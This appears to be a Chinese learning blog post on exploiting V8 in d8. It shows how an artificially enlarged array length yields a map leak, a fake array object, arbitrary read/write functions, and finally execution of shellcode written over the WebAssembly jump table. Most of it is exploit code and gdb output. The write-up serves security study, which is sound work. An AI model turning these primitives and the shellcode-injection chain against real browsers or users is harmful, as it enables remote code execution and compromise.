---
title: "V8 学习笔记 0x02"
description: "采用 OOB 的方式来劫持程序执行流"
pubDate: 2026-04-27
category: v8
tags: [v8]
order: 3
---

## 回顾
上一篇看到，浮点数组和对象数组的 `elements` 都紧跟在数组对象后面。
```C
struct array {
    map* map;
    properties* properties;
    elements* element;
    long long length;
};

struct elements {
    map* map;
    long long length;
    type val[];
}
```
并且 `elements` 和数组对象本身是相邻的。

## 设想
如果能通过别的漏洞把 `length` 改大，越界读写就变成了任意地址读写。

## 实践

### 准备
先定义两个变量：
```js
x = [1.5, 0, 0, 0, 5.0, 6.0, 7.0, 8.0, 9.0, 10.0, 11.0, 12.0, 13.0, 14.0, 15.0, 16.0];

y = [x, x];
```
`x` 是浮点数组，`y` 是对象数组，里面装的是 `x` 的引用。

### 修改 length
打印 `x` 的布局再断下来，然后在 gdb 里手动改它的 `length` 字段。
```js
%DebugPrint(x);

%SystemBreak();
```

打印出来 `x` 的地址是 **0x3f6e6bd15fc8**（原文写作 `0x3f6e6bd15fc9-1`，减 1 就是去掉最低位的标记位）。
```
DebugPrint: 0x3f6e6bd15fc9: [JSArray]
 - map: 0x1e41c779e6e1 <Map[32](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x1e41c779d9c9 <JSArray[0]>
 - elements: 0x3f6e6bd15f39 <FixedDoubleArray[16]> [PACKED_DOUBLE_ELEMENTS]
 - length: 16
 - properties: 0x019735740e19 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x19735741921: [String] in ReadOnlySpace: #length: 0x079718c479c1 <AccessorInfo name= 0x019735741921 <String[6]: #length>, data= 0x019735740011 <undefined>> (const accessor descriptor, attrs: [W__])
 }
 - elements: 0x3f6e6bd15f39 <FixedDoubleArray[16]> {
           0: 1.5 (0x3ff8000000000000)
         1-3: 0 (0x0)
           4: 5 (0x4014000000000000)
           5: 6 (0x4018000000000000)
           6: 7 (0x401c000000000000)
           7: 8 (0x4020000000000000)
           8: 9 (0x4022000000000000)
           9: 10 (0x4024000000000000)
          10: 11 (0x4026000000000000)
          11: 12 (0x4028000000000000)
          12: 13 (0x402a000000000000)
          13: 14 (0x402c000000000000)
          14: 15 (0x402e000000000000)
          15: 16 (0x4030000000000000)
 }
```
用 `tel` 看这块内存的排布：
```
pwndbg> tel 0x3f6e6bd15fc8
00:0000│     0x3f6e6bd15fc8 —▸ 0x1e41c779e6e1 ◂— 0x400001e41c77915
01:0008│     0x3f6e6bd15fd0 —▸ 0x19735740e19 ◂— 0x19735740a
02:0010│     0x3f6e6bd15fd8 —▸ 0x3f6e6bd15f39 ◂— 0x197357410
03:0018│     0x3f6e6bd15fe0 ◂— 0x1000000000
04:0020│     0x3f6e6bd15fe8 —▸ 0x19735740a71 ◂— 0x197357407
05:0028│     0x3f6e6bd15ff0 ◂— 0x200000000
06:0030│     0x3f6e6bd15ff8 —▸ 0x3f6e6bd15fc9 ◂— 0x1900001e41c779e6
07:0038│     0x3f6e6bd16000 —▸ 0x3f6e6bd15fc9 ◂— 0x1900001e41c779e6
```

**0x3f6e6bd15fe0** 就是 `length` 那个槽，用 gdb 的 `set` 改掉再验证：
```
pwndbg> set {int}0x3f6e6bd15fe4=0x20
pwndbg> tel 0x3f6e6bd15fc8
00:0000│     0x3f6e6bd15fc8 —▸ 0x1e41c779e6e1 ◂— 0x400001e41c77915
01:0008│     0x3f6e6bd15fd0 —▸ 0x19735740e19 ◂— 0x19735740a
02:0010│     0x3f6e6bd15fd8 —▸ 0x3f6e6bd15f39 ◂— 0x197357410
03:0018│     0x3f6e6bd15fe0 ◂— 0x2000000000
04:0020│     0x3f6e6bd15fe8 —▸ 0x19735740a71 ◂— 0x197357407
05:0028│     0x3f6e6bd15ff0 ◂— 0x200000000
06:0030│     0x3f6e6bd15ff8 —▸ 0x3f6e6bd15fc9 ◂— 0x1900001e41c779e6
07:0038│     0x3f6e6bd16000 —▸ 0x3f6e6bd15fc9 ◂— 0x1900001e41c779e6
pwndbg> job 0x3f6e6bd15fc9
0x3f6e6bd15fc9: [JSArray]
 - map: 0x1e41c779e6e1 <Map[32](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x1e41c779d9c9 <JSArray[0]>
 - elements: 0x3f6e6bd15f39 <FixedDoubleArray[16]> [PACKED_DOUBLE_ELEMENTS]
 - length: 32
 - properties: 0x019735740e19 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x19735741921: [String] in ReadOnlySpace: #length: 0x079718c479c1 <AccessorInfo name= 0x019735741921 <String[6]: #length>, data= 0x019735740011 <undefined>> (const accessor descriptor, attrs: [W__])
 }
 - elements: 0x3f6e6bd15f39 <FixedDoubleArray[16]> {
           0: 1.5 (0x3ff8000000000000)
         1-3: 0 (0x0)
           4: 5 (0x4014000000000000)
           5: 6 (0x4018000000000000)
           6: 7 (0x401c000000000000)
           7: 8 (0x4020000000000000)
           8: 9 (0x4022000000000000)
           9: 10 (0x4024000000000000)
          10: 11 (0x4026000000000000)
          11: 12 (0x4028000000000000)
          12: 13 (0x402a000000000000)
          13: 14 (0x402c000000000000)
          14: 15 (0x402e000000000000)
          15: 16 (0x4030000000000000)
 }
```
`length` 被改成了 32（也就是 `0x20`），数组的边界就此失守。

### 越界读
申请一块 8 字节的 ArrayBuffer，再用 DataView 读写它——这样就能在 float64 和 uint64 之间来回转。
```js
let buf = new ArrayBuffer(8);
let view = new DataView(buf);

view.setFloat64(0, x[16], true);
let doublemap = view.getBigUint64(0, true);
print(doublemap.toString(16));
```
这样就成功读出了 `x[16]`，也就是 `x` 的 map 字段（double map 对应的值）。

用同样的方法读出 `x` 的 `elements` 字段：

### 伪造 double array
```C
view.setBigUint64(0, 0x200000000n, true);
x[3] = view.getFloat64(0, true);

view.setBigInt64(0, doublemap, true);
x[0] = view.getFloat64(0, true);
```
`x[0]`~`x[3]` 凑成一个 `fake array object`，其中 properties 字段为 0。

能这么拼是因为浮点数组的 `elements` 里存的就是 double：用 `DataView` 按位写，可以精确控制每个 8 字节。`x[0]` 到 `x[3]` 一共 32 字节，正好是一个对象头——`map`、`properties`、`elements`、`length` 四个字段挨着摆。

### 获取 fake array object
```js
view.setBigUint64(0, element+0x10n, true);
x[22] = view.getFloat64(0, true);
obj = y[0];
```
通过越界写改掉 `y[0]`，也就是 `y` 的 elements 第一个槽，再从 `y[0]` 拿到伪造的对象。

### 任意读写
现在手里有了一个字段可以随便改的 array 对象：改写它的 `elements`，读写就落到了任意地址上。把这两步封装成函数：
```js
function readval(addr) {
    view.setBigUint64(0, addr-0x10n+1n, true);
    x[2] = view.getFloat64(0, true);
    view.setFloat64(0, obj[0], true);
    return view.getBigUint64(0, true);
}

function writeval(addr, val) {
    view.setBigUint64(0, addr-0x10n+1n, true);
    x[2] = view.getFloat64(0, true);
    view.setBigUint64(0, val, true);
    obj[0] = view.getFloat64(0, true);
}
```

### 执行流劫持
有了 AAR 和 AAW 之后，就该想执行流了。

老版本还能靠 `__free_hook` 这类东西，新版本没这条路了；这里换一条：JavaScript 支持注入 WebAssembly 代码。

> WebAssembly (Wasm) 是一种**二进制指令格式**，旨在作为一种可移植的编译目标，用于在现代 Web 浏览器中运行高性能的应用程序。

生成 wasm 时，d8 会申请一块可读可写可执行的段放字节码。把这块内存覆写成 shellcode，再让 JS 去调用它，执行流就到手了。
```js
var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
```

地址这样拿：先读 `wasmInstance` 的 `trusted_data` 字段，再读 `trusted_data` 的 `jump_table_start`，就是那块可执行内存的起点；然后用任意地址写把 shellcode 盖上去。
```js
let sc = [5188146770760222536n, 10180386957671122887n, 14035265928560645429n, 14359732973853474822n, 18388557918367661248n, 2409263538477991183n, 10416984888683040768n]

y[1] = wasmInstance;
view.setFloat64(0, x[23], true);
let insaddr = view.getBigUint64(0, true) - 0x1n;
print("wasmInstance: 0x" + insaddr.toString(16));

let data = readval(insaddr + 0x18n) - 0x1n;
print("Data: 0x" + data.toString(16));

let jmpaddr = readval(data + 0x38n);
print("jump_table_start: 0x" + jmpaddr.toString(16));

for (let i = 0; i < sc.length; i++) {
    writeval(jmpaddr + 0x9c0n + BigInt(i * 8), sc[i]);
}

f();
```

最后再调用 f，也就是 wasm 代码，就能运行刚才写的 shellcode 了。

## 特别鸣谢
感谢 NepNep 战队的 [sysNow](https://sysnow.xyz/) 师傅。
写完 PHP 那篇之后，sysNow 师傅发来一篇 V8 的文章，正好顺势把 V8 也过了一遍；中间想不明白的地方，也都是他给讲的。
